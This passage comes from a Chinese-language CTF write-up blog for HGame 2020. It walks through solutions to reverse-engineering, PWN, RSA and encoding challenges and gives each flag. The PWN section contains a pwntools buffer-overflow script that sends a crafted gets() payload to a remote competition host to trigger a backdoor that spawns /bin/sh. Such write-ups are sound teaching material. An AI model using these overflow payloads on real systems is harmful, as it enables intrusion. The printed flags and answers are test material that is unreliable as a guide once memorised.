class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sub_140002AE0</span>((__int64)&amp;v13);                 <span class="comment">// 大概是string类的构造函数</span></span><br><span class="line"> <span class="built_in">sub_1400018D0</span>(std::cin, &amp;v13);                <span class="comment">// cin&gt;&gt;v13</span></span><br><span class="line"> v15 = <span class="string">&quot;hgame&#123;&quot;</span>;</span><br><span class="line"> <span class="built_in">sub_140002B30</span>((__int64)&amp;v14);</span><br><span class="line"> <span class="keyword">if</span> ( <span class="built_in">find_sub</span>(&amp;v13, v15, <span class="number">0</span>i64) || <span class="built_in">find_sub</span>(&amp;v13, <span class="string">&quot;&#125;&quot;</span>, <span class="number">0</span>i64) != <span class="number">61</span> )<span class="comment">// 猜测输入字符串长度位62，格式位hgame&#123;***&#125;</span></span><br><span class="line"> &#123;</span><br><span class="line">   v5 = <span class="built_in">sub_140001900</span>(std::cout, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">   std::basic_ostream&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v5, sub_140002830);</span><br><span class="line">   <span class="built_in">sub_140003010</span>(&amp;v14);</span><br><span class="line">   <span class="built_in">sub_140002FA0</span>(&amp;v13);</span><br><span class="line">   result = <span class="number">0</span>i64;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">6</span>i64; ; i = v11 + <span class="number">1</span> )             <span class="comment">// 一波操作完全看不懂，猜测是根据&#x27;_&#x27;来分割字符串，分割成9个数</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">LOBYTE</span>(v0) = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">     v11 = <span class="built_in">find</span>(&amp;v13, v0, i);</span><br><span class="line">     <span class="keyword">if</span> ( v11 == <span class="number">-1</span> )</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     v16 = <span class="built_in">sub_1400043B0</span>(&amp;v13, &amp;v40, i, v11 - i);</span><br><span class="line">     v17 = v16;</span><br><span class="line">     v1 = <span class="built_in">sub_140003E80</span>(v16);</span><br><span class="line">     v18 = <span class="built_in">atoll</span>(v1);</span><br><span class="line">     <span class="built_in">sub_140004350</span>(&amp;v14, &amp;v18);</span><br><span class="line">     <span class="built_in">sub_140002FA0</span>(&amp;v40);</span><br><span class="line">   &#125;</span><br><span class="line">   v19 = <span class="built_in">sub_1400043B0</span>(&amp;v13, &amp;v41, i, <span class="number">61</span> - i);</span><br><span class="line">   v20 = v19;</span><br><span class="line">   v2 = <span class="built_in">sub_140003E80</span>(v19);</span><br><span class="line">   v21 = <span class="built_in">atoll</span>(v2);                            <span class="comment">// 直接把字符串转换成长整型，说明字符串里就是以&#x27;_&#x27;连接的数字</span></span><br><span class="line">   <span class="built_in">sub_140004350</span>(&amp;v14, &amp;v21);</span><br><span class="line">   <span class="built_in">sub_140002FA0</span>(&amp;v41);</span><br><span class="line">   v31 = <span class="number">26727</span>i64;                             <span class="comment">// 根据下面的运算这里应该是两个矩阵</span></span><br><span class="line">   v32 = <span class="number">24941</span>i64;</span><br><span class="line">   v33 = <span class="number">101</span>i64;</span><br><span class="line">   v34 = <span class="number">29285</span>i64;</span><br><span class="line">   v35 = <span class="number">26995</span>i64;</span><br><span class="line">   v36 = <span class="number">29551</span>i64;</span><br><span class="line">   v37 = <span class="number">29551</span>i64;</span><br><span class="line">   v38 = <span class="number">25953</span>i64;</span><br><span class="line">   v39 = <span class="number">29561</span>i64;</span><br><span class="line">   v22 = <span class="number">1</span>i64;</span><br><span class="line">   v23 = <span class="number">0</span>i64;</span><br><span class="line">   v24 = <span class="number">1</span>i64;</span><br><span class="line">   v25 = <span class="number">0</span>i64;</span><br><span class="line">   v26 = <span class="number">1</span>i64;</span><br><span class="line">   v27 = <span class="number">1</span>i64;</span><br><span class="line">   v28 = <span class="number">1</span>i64;</span><br><span class="line">   v29 = <span class="number">2</span>i64;</span><br><span class="line">   v30 = <span class="number">2</span>i64;</span><br><span class="line">   <span class="keyword">for</span> ( j = <span class="number">0</span>i64; j &lt; <span class="number">3</span>; ++j )                <span class="comment">// 三个for循环时矩阵运算，如果满足条件就直接输出正确</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">for</span> ( k = <span class="number">0</span>i64; k &lt; <span class="number">3</span>; ++k )</span><br><span class="line">     &#123;</span><br><span class="line">       v12 = <span class="number">0</span>i64;</span><br><span class="line">       <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; <span class="number">3</span>; ++l )</span><br><span class="line">         v12 += *(&amp;v22 + <span class="number">3</span> * l + k) * *(_QWORD *)<span class="built_in">sub_1400031E0</span>(&amp;v14, l + <span class="number">3</span> * j);</span><br><span class="line">       <span class="keyword">if</span> ( *(&amp;v31 + <span class="number">3</span> * j + k) != v12 )</span><br><span class="line">       &#123;</span><br><span class="line">         v3 = <span class="built_in">sub_140001900</span>(std::cout, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">         std::basic_ostream&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v3, sub_140002830);</span><br><span class="line">         <span class="built_in">sub_140003010</span>(&amp;v14);</span><br><span class="line">         <span class="built_in">sub_140002FA0</span>(&amp;v13);</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   v6 = <span class="built_in">sub_140001900</span>(std::cout, <span class="string">&quot;you are good at re&quot;</span>);</span><br><span class="line">   std::basic_ostream&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v6, sub_140002830);</span><br></pre></td></tr></table></figure>

<p>最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag</p>
<p>尝试一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>]])</span><br><span class="line">b = np.linalg.inv(a)</span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"><span class="comment"># print(np.dot(a,b))</span></span><br><span class="line">c = np.array([[<span class="number">26727</span>, <span class="number">24941</span>, <span class="number">101</span>], [<span class="number">29285</span>, <span class="number">26995</span>, <span class="number">29551</span>], [<span class="number">29551</span>, <span class="number">25953</span>, <span class="number">29561</span>]])</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">d = np.dot(c, b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        flag += <span class="built_in">str</span>(<span class="built_in">int</span>(d.item(i, j))) + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;hgame&#123;&#x27;</span> + flag[:-<span class="number">1</span>] + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>提交提示成功，猜测正确</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943&#125;</span><br></pre></td></tr></table></figure>



<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h4><p>IDA反编译</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">8u</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(_bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0xA0</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s 0O0o\\0O0!&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(<span class="string">&quot;0O0o&quot;</span>, &amp;v5, <span class="number">7u</span>) )</span><br><span class="line">    <span class="built_in">backdoor</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//backdoor</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;47.103.214.163&quot;</span>,<span class="string">&quot;20000&quot;</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./Hard_AAAAA&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Let&#x27;s 0O0o\\0O0!&quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">123</span>+<span class="string">&#x27;0O0o\0O0&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>最终得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;0OoO0oo0O0Oo&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h4><p>简单的RSA解密，p和q都已经分解出来了，其它的没什么难度</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcdext</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    a: 模的取值</span></span><br><span class="line"><span class="string">    b: 想求逆的值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, gcd = gcdext(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> y, x - a // b * y, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">275698465082361070145173688411496311542172902608559859019841</span></span><br><span class="line">p = <span class="number">681782737450022065655472455411</span></span><br><span class="line">q = <span class="number">675274897132088253519831953441</span></span><br><span class="line">e = <span class="number">13</span></span><br><span class="line">n = p * q</span><br><span class="line"><span class="comment"># print(k)</span></span><br><span class="line">fai = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">(d, k, g) = gcdext(e, fai)</span><br><span class="line"><span class="comment"># print(fai)</span></span><br><span class="line"><span class="comment"># print(k)</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line">f = m.to_bytes(<span class="number">22</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接求解出来flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;t3Xt6O0k_R5A!!!&#125;</span><br></pre></td></tr></table></figure>



<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h4><p>首先看到一长串似曾相识的东西</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</span><br></pre></td></tr></table></figure>

<p>像是摩斯电码base64加密之后的东西</p>
<p>所以base64解码之后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</span><br></pre></td></tr></table></figure>

<p>果然是摩斯电码，然后解摩斯电码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">CODE = &#123;<span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;.-&#x27;</span>, <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;-...&#x27;</span>, <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;-.-.&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;-..&#x27;</span>, <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;..-.&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;--.&#x27;</span>, <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;....&#x27;</span>, <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;..&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;.---&#x27;</span>, <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;-.-&#x27;</span>, <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;.-..&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;M&#x27;</span>: <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;-.&#x27;</span>, <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;---&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;.--.&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;--.-&#x27;</span>, <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;.-.&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;...&#x27;</span>, <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;..-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;...-&#x27;</span>, <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;.--&#x27;</span>, <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;-..-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;-.--&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;--..&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;-----&#x27;</span>, <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;.----&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;..---&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;...--&#x27;</span>, <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;....-&#x27;</span>, <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;.....&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;-....&#x27;</span>, <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;--...&#x27;</span>, <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;---..&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;----.&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;.&#x27;</span>: <span class="string">&#x27;.-.-.-&#x27;</span>, <span class="string">&#x27;:&#x27;</span>: <span class="string">&#x27;---...&#x27;</span>, <span class="string">&#x27;,&#x27;</span>: <span class="string">&#x27;--..--&#x27;</span>, <span class="string">&#x27;;&#x27;</span>: <span class="string">&#x27;-.-.-.&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;?&#x27;</span>: <span class="string">&#x27;..--..&#x27;</span>, <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;-...-&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>: <span class="string">&#x27;.----.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;-..-.&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;!&#x27;</span>: <span class="string">&#x27;-.-.--&#x27;</span>, <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;-....-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>: <span class="string">&#x27;..--.-&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>: <span class="string">&#x27;.-..-.&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;-.--.&#x27;</span>, <span class="string">&#x27;)&#x27;</span>: <span class="string">&#x27;-.--.-&#x27;</span>, <span class="string">&#x27;$&#x27;</span>: <span class="string">&#x27;...-..-&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>: <span class="string">&#x27;.-...&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;@&#x27;</span>: <span class="string">&#x27;.--.-.&#x27;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decode</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    Decode_value = CODE.keys()</span><br><span class="line">    Decode_key = CODE.values()</span><br><span class="line">    Decode_dict = <span class="built_in">dict</span>(<span class="built_in">zip</span>(Decode_key, Decode_value))</span><br><span class="line"></span><br><span class="line">    text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    msg = <span class="built_in">str</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">in</span> Decode_dict.keys():</span><br><span class="line">            text += Decode_dict[s]</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Decode(<span class="string">&#x27;.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;W3LC0ME_TO_2020_HGAM3&#125;</span><br></pre></td></tr></table></figure>

<h4 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h4><p>下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815</p>
<p>解压出来打开flag.txt，内容如下：</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\u</span>68<span class="symbol">\u</span>67<span class="symbol">\u</span>61<span class="symbol">\u</span>6d<span class="symbol">\u</span>65<span class="symbol">\u</span>7b<span class="symbol">\u</span>44<span class="symbol">\u</span>6f<span class="symbol">\u</span>5f<span class="symbol">\u</span>79<span class="symbol">\u</span>30<span class="symbol">\u</span>75<span class="symbol">\u</span>5f<span class="symbol">\u</span>4b<span class="symbol">\u</span>6e<span class="symbol">\u</span>4f<span class="symbol">\u</span>57<span class="symbol">\u</span>5f<span class="symbol">\u</span>75<span class="symbol">\u</span>4e<span class="symbol">\u</span>69<span class="symbol">\u</span>43<span class="symbol">\u</span>30<span class="symbol">\u</span>64<span class="symbol">\u</span>33<span class="symbol">\u</span>3f<span class="symbol">\u</span>7d</span><br></pre></td></tr></table></figure>

<p>unicode编码，解码得：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Do_y0u_KnOW_uNiC0d3?&#125;</span><br></pre></td></tr></table></figure>

<h4 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h4><p>压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rdjxfwxjfimkn <span class="keyword">z</span>,<span class="keyword">ts</span> wntzi xtjrwm xsfjt jm ywt rtntwhf <span class="keyword">f</span> <span class="keyword">y</span>   h jnsxf qjFjf jnb  rg fiyykwtbsnkm <span class="keyword">tm</span>  <span class="keyword">xa</span> jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.</span><br><span class="line"></span><br><span class="line">JRFVJYFZVRUAGMAI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Three fences <span class="keyword">first</span>, Five Caesar <span class="keyword">next</span>. English sentense <span class="keyword">first</span>,  zip password <span class="keyword">next</span>.</span><br></pre></td></tr></table></figure>

<p>根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Many years later <span class="keyword">as</span> he faced the firing squad, Colonel Aureliano Buendia was <span class="keyword">to</span> remember <span class="literal">that</span> distant afternoon <span class="keyword">when</span> his father took him <span class="keyword">to</span> discover ice.</span><br><span class="line"></span><br><span class="line">EAVMUBAQHQMVEPDT</span><br></pre></td></tr></table></figure>

<p>解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3Nc0dInG_@lL_iN_0Ne!&#125;</span><br></pre></td></tr></table></figure>

<p>这题有各种各样的编码，还不错</p>
<h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="RE-1"><a href="#RE-1" class="headerlink" title="RE"></a>RE</h3><h4 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h4><p>明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳<br>由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）<br>脱壳的过程借鉴<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1048649-1-1.html">https://www.52pojie.cn/thread-1048649-1-1.html</a><br>很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 